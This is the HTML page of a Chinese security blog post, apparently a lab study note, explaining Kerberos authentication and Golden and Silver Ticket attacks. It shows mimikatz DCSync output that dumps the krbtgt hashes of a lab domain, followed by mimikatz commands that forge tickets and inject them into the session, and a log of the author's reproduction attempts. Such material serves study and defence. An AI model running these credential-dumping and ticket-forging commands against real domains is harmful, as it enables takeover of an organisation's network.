@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>白银票据与黄金票据探究 | sh1yan&#39;blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="description" content="0x00  前言 在域渗透时，肯定会接触到两个最常见的概念，白银票据和黄金票据，而这两个票据主要是围绕着Kerberos这个认证协议所产生的。 0x01  Kerberos认证 Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上">
+<meta name="keywords" content="域渗透,Kerberos认证">
+<meta property="og:type" content="article">
+<meta property="og:title" content="白银票据与黄金票据探究">
+<meta property="og:url" content="sh1yan.top/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00  前言 在域渗透时，肯定会接触到两个最常见的概念，白银票据和黄金票据，而这两个票据主要是围绕着Kerberos这个认证协议所产生的。 0x01  Kerberos认证 Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http:\\sh1yan.top\photo\Discussion-on-Silver-Bill-and-Gold-Bill\kerberos_is_rz.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\Discussion-on-Silver-Bill-and-Gold-Bill\win2003.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\Discussion-on-Silver-Bill-and-Gold-Bill\winxp.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\Discussion-on-Silver-Bill-and-Gold-Bill\win2008.png">
+<meta property="og:updated_time" content="2019-06-03T15:09:14.900Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="白银票据与黄金票据探究">
+<meta name="twitter:description" content="0x00  前言 在域渗透时，肯定会接触到两个最常见的概念，白银票据和黄金票据，而这两个票据主要是围绕着Kerberos这个认证协议所产生的。 0x01  Kerberos认证 Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上">
+<meta name="twitter:image" content="http:\\sh1yan.top\photo\Discussion-on-Silver-Bill-and-Gold-Bill\kerberos_is_rz.png">
+  
+    <link rel="alternative" href="/atom.xml" title="sh1yan&#39;blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link href="//fonts.googleapis.com/css?family=Inconsolata" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/gossip">Gossip</a>
+        
+          <a class="main-nav-link" href="/yqlj">Links</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="sh1yan.top"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Discussion-on-Silver-Bill-and-Gold-Bill" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/" class="article-date">
+  <time datetime="2019-06-03T15:52:55.000Z" itemprop="datePublished">2019-06-03</time>
+</a>
+
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/学习笔记/">学习笔记</a>
+  </div>
+
+
+  </div>
+  <div class="article-inner">
+    
+
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      白银票据与黄金票据探究
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <div class="article-sharing">
+  <ul>
+    <li>
+      <div class="fb-like" data-send="false" data-layout="button_count" data-show-faces="false" data-font="verdana" data-href="sh1yan.top/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/"></div>
+    </li>
+  </ul>
+</div>
+
+      
+      
+        
+        <p><strong>0x00  前言</strong></p>
+<p>在域渗透时，肯定会接触到两个最常见的概念，白银票据和黄金票据，而这两个票据主要是围绕着Kerberos这个认证协议所产生的。</p>
+<p><strong>0x01  Kerberos认证</strong></p>
+<p>Kerberos 是一种网络认证协议，其设计目标是通过<a href="https://baike.baidu.com/item/%E5%AF%86%E9%92%A5" target="_blank" rel="noopener">密钥</a>系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">主机操作系统</a>的认证，无需基于<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA%E5%9C%B0%E5%9D%80" target="_blank" rel="noopener">主机地址</a>的信任，不要求网络上所有主机的物理安全，并假定网络上传送的<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%8C%85" target="_blank" rel="noopener">数据包</a>可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的<a href="https://baike.baidu.com/item/%E5%AF%86%E7%A0%81%E6%8A%80%E6%9C%AF" target="_blank" rel="noopener">密码技术</a>（如：共享密钥）执行认证服务的。<br><a id="more"></a><br>整个认证过程需要以下设备：</p>
+<ul>
+<li>客户端（Client）</li>
+<li>服务端（Server）</li>
+<li>认证端（KDC）</li>
+</ul>
+<p>一张图演示下流程：</p>
+<p><img src="http:\\sh1yan.top\photo\Discussion-on-Silver-Bill-and-Gold-Bill\kerberos_is_rz.png" alt></p>
+<p>如图中显示的，步骤主要分三个来回认证步骤：</p>
+<blockquote>
+<p>K(c,tgs)：session_key(client与tgs之间的通信)</p>
+<p>K(c,s)：session_key(client与server之间的通信)</p>
+</blockquote>
+<p>步骤一：Client  –〉DC（KDC（as））；客户端向认证服务器（AS）发送一个认证请求（KRB_AS_REQ）。</p>
+<p>发送内容① ：[Pre-authentication data（client is ntlm_hash for Timestamp）,Client name &amp; realm（DomainName\Username）,Server Name（KDC TGS NAME）]</p>
+<p>步骤二：DC（KDC（as）） –〉Client ；认证服务器（AS）认证通过后（对比用户名是否在本地数据库中），给客户端发送加密后的Session Key和TGT凭证（KRB_AS_REP）。Session_key = K(c,tgs)</p>
+<p>发送内容②：[Client_ntlm_hash(K(c,tgs))],[Krbtgt_ntlm_hash(k(c,tgs),Client_name(DomainName\Username),TGT_EndTime)]</p>
+<p>步骤三：Client –〉DC（KDC（tgs））；客户端拿着自己加密的Session_key和TGT凭证向票据生成服务器（TGS）发起一个认证请求（KRB_TGS_REQ）。</p>
+<p>发送内容③ ：[Session_key(Authenticator（[DomainName\Username,ServerName(DomainName\Server)]）)],[TGT]</p>
+<p>步骤四：DC（KDC（tgs）） –〉Client ；票据生成服务器（TGS）认证通过后，给客户端发送加密后的Session_key和ticket票据（KRB_TGS_REP）。Session_key = K(c,s)</p>
+<p>发送内容④ ：k(c,tgs)加密[Session_key],[Server_ntlm_hash(Tiket（K(c,s),Client_Name(domainName\Username),TGT_EndTime）)]</p>
+<p>步骤五：Client –〉Server ；客户端拿着自己加密的Session_key和ticket票据，去访问服务器（无双向认证的话，认证通过后， 即可访问，若双向认证，认证通过后继续走到步骤六）。</p>
+<p>发送内容⑤：K(c,s)加密[Authenticator（[DomainName\Username,ServerName(DomainName\Server)]）],[Tiket]</p>
+<p>步骤六：Server–〉Client ；服务器认证通过后，放行，并且给客户端发送一个加密的Authenticator，用于让客户端识别是否访问正确的服务端。</p>
+<p>发送内容⑥：K(c,s)加密[Authenticator]</p>
+<p><strong>0x02 DC域控和Krbtgt_hash</strong></p>
+<p>kerberos认证服务器称KDC，它是由 Authentication Service 和 Ticket Granting Service 组成，但是它会访问 AD数据库，在认证中会需要到。</p>
+<p>Krbtgt这个账号的密码，储存在域控服务上。下面我们使用Mimikatz对该账号进行密码抓取：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">  .#####.   mimikatz <span class="number">2</span>.<span class="number">0</span> alpha (x64) release "Kiwi en C" (Oct <span class="number">16</span> <span class="number">2015</span> <span class="number">01</span>:<span class="number">36</span>:<span class="number">00</span>)</span><br><span class="line"> .## ^ ##.  </span><br><span class="line"> ## / \ ##  /* * *</span><br><span class="line"> ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)</span><br><span class="line">  '#####'                                     with <span class="number">17</span> modules * * */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # privilege::debug</span><br><span class="line">Privilege '<span class="number">20</span>' OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # lsadump::dcsync /user:krbtgt</span><br><span class="line">[DC] 'shiyan.com' will be the domain</span><br><span class="line">[DC] 'WIN-<span class="number">2008</span>-DC.shiyan.com' will be the DC server</span><br><span class="line"></span><br><span class="line">[DC] 'krbtgt' will be the user account</span><br><span class="line"></span><br><span class="line">Object RDN           : krbtgt</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : krbtgt</span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000000</span> ( USER_OBJECT )</span><br><span class="line">User Account Control : <span class="number">00000202</span> ( ACCOUNTDISABLE NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   : </span><br><span class="line">Password last change : <span class="number">2019</span>/<span class="number">3</span>/<span class="number">10</span> <span class="number">16</span>:<span class="number">32</span>:<span class="number">32</span></span><br><span class="line">Object Security ID   : S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">1519369487</span>-<span class="number">284112811</span>-<span class="number">2415659819</span>-<span class="number">502</span></span><br><span class="line">Object Relative ID   : <span class="number">502</span></span><br><span class="line"></span><br><span class="line"><span class="function">Credentials:</span></span><br><span class="line"><span class="function">  <span class="title">Hash</span> <span class="title">NTLM</span>: <span class="title">f485a96fccc63f78ad5d97c1a9e7ccdc</span></span></span><br><span class="line"><span class="function">    <span class="title">ntlm</span>- 0: <span class="title">f485a96fccc63f78ad5d97c1a9e7ccdc</span></span></span><br><span class="line"><span class="function">    <span class="title">lm</span>  - 0: 86092<span class="title">d17337fdadc0c1464e8d80d83df</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Supplemental</span> <span class="title">Credentials</span>:</span></span><br><span class="line"><span class="function">* <span class="title">Primary:Kerberos</span>-<span class="title">Newer</span>-<span class="title">Keys</span> *</span></span><br><span class="line"><span class="function">    <span class="title">Default</span> <span class="title">Salt</span> : <span class="title">SHIYAN.COMkrbtgt</span></span></span><br><span class="line"><span class="function">    <span class="title">Default</span> <span class="title">Iterations</span> : 4096</span></span><br><span class="line"><span class="function">    <span class="title">Credentials</span></span></span><br><span class="line"><span class="function">      <span class="title">aes256_hmac</span>       (4096) : <span class="title">fb147173be1b6a2a8eac268939dd69c32fb171de20efcb54906a36258b636073</span></span></span><br><span class="line"><span class="function">      <span class="title">aes128_hmac</span>       (4096) : <span class="title">b59eb41b15584131568980b934145fc1</span></span></span><br><span class="line"><span class="function">      <span class="title">des_cbc_md5</span>       (4096) : 5<span class="title">b522994989e014f</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">* <span class="title">Primary:Kerberos</span> *</span></span><br><span class="line"><span class="function">    <span class="title">Default</span> <span class="title">Salt</span> : <span class="title">SHIYAN.COMkrbtgt</span></span></span><br><span class="line"><span class="function">    <span class="title">Credentials</span></span></span><br><span class="line"><span class="function">      <span class="title">des_cbc_md5</span>       : 5<span class="title">b522994989e014f</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">* <span class="title">Packages</span> *</span></span><br><span class="line"><span class="function">    <span class="title">Kerberos</span>-<span class="title">Newer</span>-<span class="title">Keys</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">* <span class="title">Primary:WDigest</span> *</span></span><br><span class="line"><span class="function">    01  <span class="title">e23885a89ebfaf81a83a9958af90347c</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span>(<span class="title">commandline</span>) # <span class="title">exit</span></span></span><br><span class="line"><span class="function"><span class="title">Bye</span>!</span></span><br></pre></td></tr></table></figure>
+<p><strong>0x03 黄金票据</strong></p>
+<p>黄金票据主要是发生在kerberos的第三和第四步骤上。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第二步骤，AS发给客户端的数据。</span></span><br><span class="line">[Client_ntlm_hash(K(c,tgs))],[Krbtgt_ntlm_hash(k(c,tgs),Client_name(DomainName\Username),TGT_EndTime)]</span><br></pre></td></tr></table></figure>
+<p>在第三步骤时，客户端拥有两个数据，一个是自己账号ntlm_hash加密的session_key、一个是TGT凭证，而这个TGT凭证是kertgt的ntlm_hash加密的信息。</p>
+<p>而当我们知道kertgt的ntlm_hash时，我们是不是就可以伪造TGT凭证，发送给票据生成服务器（TGS）？</p>
+<p>如第三步骤中需要发送的内容：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Session_key(Authenticator（[DomainName\Username,ServerName(DomainName\Server)]）)],[TGT（Krbtgt_ntlm_hash(k(c,tgs),Client_name(DomainName\Username),TGT_EndTime)）]</span><br></pre></td></tr></table></figure>
+<p>这样，我们就可以访问域内任意一台服务器</p>
+<p><strong>伪造方法：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /rc4:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ptt"</span> exit</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"kerberos::golden /domain:shiyan.com /sid:S-1-5-21-1519369487-284112811-2415659819 /rc4:f485a96fccc63f78ad5d97c1a9e7ccdc /user:administrator /ptt"</span> exit</span><br></pre></td></tr></table></figure>
+<p><strong>在网上还找见一个方法：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mimikatz<span class="comment"># kerberos::gloden /domain:shiyan.com /sid:S-1-5-21-1519369487-284112811-2415659819 /krbtgt:f485a96fccc63f78ad5d97c1a9e7ccdc /user:Administrator /ticket:test.kribi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">or</span></span><br><span class="line"></span><br><span class="line">mimikatz<span class="comment"># kerberos::gloden /domain:shiyan.com /sid:S-1-5-21-1519369487-284112811-2415659819 /aes256:fb147173be1b6a2a8eac268939dd69c32fb171de20efcb54906a36258b636073 /user:Administrator /ticket:test.kribi</span></span><br></pre></td></tr></table></figure>
+<p>然后再导入这个test.kribi文件。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz::ptt test.kribi</span><br></pre></td></tr></table></figure>
+<p>然后即可访问其它域成员默认共享目录。</p>
+<p><strong>0x04 白银票据</strong></p>
+<p>白银票据主要是发生在第五步骤上。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k(c,tgs)加密[Session_key],[Server_ntlm_hash(Tiket（K(c,s),Client_Name(domainName\Username),TGT_EndTime）)]</span><br></pre></td></tr></table></figure>
+<p>在第四步骤时，票据生成服务器（TGS）给我们发了上面的数据，在第五步骤时，我们需要发送下面的数据。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">K(c,s)加密[Authenticator（[DomainName\Username,ServerName(DomainName\Server)]）],[Tiket（Server_ntlm_hash(Tiket（K(c,s),Client_Name(domainName\Username),TGT_EndTime）)）]</span><br></pre></td></tr></table></figure>
+<p>从需要发送的数据上看，只要我们有了server_ntlm_hash，我们就可以伪造Tiket的，这个也就是白银票据。</p>
+<p><strong>伪造方法：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;用户名&gt; /ptt"</span> exit</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator@SHIYAN.COM /domain:SHIYAN.COM /sid:S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3794943108</span><span class="number">-2167292304</span><span class="number">-869428770</span><span class="number">-500</span> /target:win<span class="number">-2003.</span>shiyan.com/rc4:<span class="number">3</span>daa81d4a957bbd06f94f5ee1bbcff33 /service:cifs /ptt</span><br></pre></td></tr></table></figure>
+<p>可以伪造的服务：</p>
+<table>
+<thead>
+<tr>
+<th>服务类型</th>
+<th>服务名</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>WMI</td>
+<td>HOST、RPCSS</td>
+</tr>
+<tr>
+<td>PowerShell Remoting</td>
+<td>HOST、HTTP</td>
+</tr>
+<tr>
+<td>WinRM</td>
+<td>HOST、HTTP</td>
+</tr>
+<tr>
+<td>Scheduled Tasks</td>
+<td>HOST</td>
+</tr>
+<tr>
+<td>Windows File Share (CIFS)</td>
+<td>CIFS</td>
+</tr>
+<tr>
+<td>LDAP operations including</td>
+<td>LDAP</td>
+</tr>
+<tr>
+<td>Mimikatz DCSync</td>
+<td>LDAP</td>
+</tr>
+<tr>
+<td>Windows Remote Server Administration Tools</td>
+<td>RPCSS、LDAP、CIFS</td>
+</tr>
+</tbody>
+</table>
+<p><strong>0x05  白银票据与黄金票据的不同点</strong></p>
+<p>1)  访问权限不同</p>
+<p>Golden Ticket: 伪造 TGT,可以获取任何 Kerberos 服务权限<br>Silver Ticket: 伪造 TGS,只能访问指定的服务</p>
+<p>2)  加密方式不同</p>
+<p>Golden Ticket 由 Kerberos 的 Hash 加密<br>Silver Ticket 由服务账号(通常为计算机账户)Hash 加密</p>
+<p>3)  认证流程不同</p>
+<p>Golden Ticket 的利用过程需要访问域控,而 Silver Ticket 不需要</p>
+<p><strong>0x06 心酸的复现篇</strong></p>
+<p>域控：win2008，192.168.3.118</p>
+<p>域成员1：win2003,192.168.3.119</p>
+<p>域成员2：winxp，192.168.3.138</p>
+<p>域成员3：win2012，192.168.3.129</p>
+<p>伪域成员：win7，192.168.3.156</p>
+<p><strong>复现开始！</strong></p>
+<p>win2003  —白银票据—〉winxp  ，报错_无法伪造</p>
+<p>ERROR kuhl_m_kerberos_ptt_data ; LsaCallAuthenticationPackage KerbSubmitTicketMe ssage : c000000d</p>
+<p>win2003  —白银票据—〉win2012  ，报错_无法伪造</p>
+<p>ERROR kuhl_m_kerberos_ptt_data ; LsaCallAuthenticationPackage KerbSubmitTicketMe ssage : c000000d</p>
+<p>winxp  —白银票据—〉win2003，成功_无法利用 </p>
+<p>Golden ticket for <a href="mailto:&#39;administrator@shiyan.com" target="_blank" rel="noopener">&#39;administrator@shiyan.com</a>‘ successfully submitted for current session</p>
+<p>\\win2003.shiyan.com\C$</p>
+<p>弹出登录框。。。。。</p>
+<p>换目标。。。。</p>
+<p>————————————–优雅的分割线————————————-</p>
+<p>启动  win7，打开我的电脑，鼠标右键，修改计算机名称，加入域 shiyan.com ，彭！报错！</p>
+<p>无法与域“shiyan.com”的Actice Directory域控制器（AD DC）连接。</p>
+<p>继续各种百度配置中。。。</p>
+<p>无法与域“shiyan.com”的Actice Directory域控制器（AD DC）连接。</p>
+<p>好吧， 我放弃了！！！</p>
+<p>————————————–优雅的分割线————————————-</p>
+<p>win2012  —白银票据—〉winxp，成功_无法利用 </p>
+<p>Golden ticket for <a href="mailto:&#39;administrator@shiyan.com" target="_blank" rel="noopener">&#39;administrator@shiyan.com</a>‘ successfully submitted for current session</p>
+<p>\\winxp.shiyan.com\C$</p>
+<p>弹出登录框。。。。。</p>
+<p>各种瞎几把调试本地安全策略。。。。</p>
+<p>然后巨坑的一步来了！！！没错，巨坑的一步来了。。。</p>
+<p><img src="http:\\sh1yan.top\photo\Discussion-on-Silver-Bill-and-Gold-Bill\win2003.png" alt></p>
+<p><img src="http:\\sh1yan.top\photo\Discussion-on-Silver-Bill-and-Gold-Bill\winxp.png" alt></p>
+<p><img src="http:\\sh1yan.top\photo\Discussion-on-Silver-Bill-and-Gold-Bill\win2008.png" alt></p>
+<p>直接无障碍，域内随便访问了。。。。。</p>
+<p>不搞了，不搞了。。。太菜了。。。</p>
+<p><strong>0x07 参考文章</strong></p>
+<p>[1]<a href="https://vonjk.red/2019/02/04/kerberos-%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/" target="_blank" rel="noopener">https://vonjk.red/2019/02/04/kerberos-%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/</a><br>[2]<a href="https://sakuxa.com/2019/04/03/02-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BKerberos/" target="_blank" rel="noopener">https://sakuxa.com/2019/04/03/02-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BKerberos/</a><br>[3]<a href="http://1ypt0.top/2019/04/21/%E8%AE%A4%E8%AF%81%E7%90%90%E7%A2%8E/" target="_blank" rel="noopener">http://1ypt0.top/2019/04/21/%E8%AE%A4%E8%AF%81%E7%90%90%E7%A2%8E/</a><br>[4]<a href="https://www.tttang.com/archive/974/" target="_blank" rel="noopener">https://www.tttang.com/archive/974/</a><br>[5]<a href="https://klionsec.github.io/2016/08/10/ntlm-kerberos/?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">https://klionsec.github.io/2016/08/10/ntlm-kerberos/?tdsourcetag=s_pcqq_aiomsg</a><br>[6]<a href="https://blog.csdn.net/include_heqile/article/details/88663612" target="_blank" rel="noopener">https://blog.csdn.net/include_heqile/article/details/88663612</a></p>
+
+      
+      
+        
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="sh1yan.top/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/" data-id="cl64hepdv000jasw1hodljjnj" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kerberos认证/">Kerberos认证</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/域渗透/">域渗透</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+    
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-about" class="widget-title">About</h3>
+    <div class="widget">
+
+<!-- 优美的分割线 -->
+
+    <div style="width:249px;height:190px;border:1px none ;text-align:center">
+  <img src="//sh1yan.top/icon.png" alt="shiyan" style="width:190px;height:190px;display:inline-block;margin:0 auto">
+  </div>
+<br>
+
+
+<p style="font-size:15px">ID：shiyan</p>
+<p style="font-size:14px">个人简介：会开挖挖机的园工~</p>
+<p style="font-size:14px">
+<a href="mailto:506130869@qq.com">Email：506130869@qq.com</a><br>
+<a href="https://github.com/shiyan-520">GitHub：https://github.com/shiyan-520</a>
+</p>
+
+
+<!-- 优美的分割线 -->
+
+      
+      
+      <p></p>
+      
+      
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-tagcloud" class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Android/" style="font-size: 10px;">Android</a> <a href="/tags/ByPass-UAC/" style="font-size: 10px;">ByPass-UAC</a> <a href="/tags/CMS/" style="font-size: 13.33px;">CMS</a> <a href="/tags/COM组件劫持/" style="font-size: 10px;">COM组件劫持</a> <a href="/tags/Cobalt-Strike/" style="font-size: 10px;">Cobalt Strike</a> <a href="/tags/DLL劫持/" style="font-size: 10px;">DLL劫持</a> <a href="/tags/Excel/" style="font-size: 13.33px;">Excel</a> <a href="/tags/JavaWeb/" style="font-size: 20px;">JavaWeb</a> <a href="/tags/Kerberos认证/" style="font-size: 10px;">Kerberos认证</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/PHP/" style="font-size: 13.33px;">PHP</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/Python3/" style="font-size: 10px;">Python3</a> <a href="/tags/Rmi协议/" style="font-size: 10px;">Rmi协议</a> <a href="/tags/SMBMS/" style="font-size: 10px;">SMBMS</a> <a href="/tags/UAC/" style="font-size: 10px;">UAC</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/access-token/" style="font-size: 10px;">access token</a> <a href="/tags/burp/" style="font-size: 16.67px;">burp</a> <a href="/tags/hash/" style="font-size: 10px;">hash</a> <a href="/tags/java/" style="font-size: 10px;">java</a> <a href="/tags/jsonp/" style="font-size: 10px;">jsonp</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/tags/mybatis/" style="font-size: 10px;">mybatis</a> <a href="/tags/mysql/" style="font-size: 13.33px;">mysql</a> <a href="/tags/pandas/" style="font-size: 10px;">pandas</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/spring5/" style="font-size: 10px;">spring5</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/vba/" style="font-size: 13.33px;">vba</a> <a href="/tags/web漏洞/" style="font-size: 13.33px;">web漏洞</a> <a href="/tags/令牌伪造/" style="font-size: 10px;">令牌伪造</a> <a href="/tags/动态代理/" style="font-size: 10px;">动态代理</a> <a href="/tags/博客源码/" style="font-size: 10px;">博客源码</a> <a href="/tags/博客问题解决/" style="font-size: 10px;">博客问题解决</a> <a href="/tags/反射/" style="font-size: 10px;">反射</a> <a href="/tags/域渗透/" style="font-size: 10px;">域渗透</a> <a href="/tags/学习笔记/" style="font-size: 16.67px;">学习笔记</a> <a href="/tags/安全审计/" style="font-size: 13.33px;">安全审计</a> <a href="/tags/安全服务/" style="font-size: 10px;">安全服务</a> <a href="/tags/工具分析/" style="font-size: 10px;">工具分析</a> <a href="/tags/序列化/" style="font-size: 10px;">序列化</a> <a href="/tags/报错注入/" style="font-size: 10px;">报错注入</a> <a href="/tags/漏洞复现/" style="font-size: 10px;">漏洞复现</a> <a href="/tags/生活记录/" style="font-size: 10px;">生活记录</a> <a href="/tags/端口转发/" style="font-size: 10px;">端口转发</a> <a href="/tags/脚本编写/" style="font-size: 10px;">脚本编写</a> <a href="/tags/部署上线/" style="font-size: 10px;">部署上线</a>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-recent-posts" class="widget-title">Recents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/03/20/Mybatis-3-learning-notes/">mybatis-3学习笔记</a>
+          </li>
+        
+          <li>
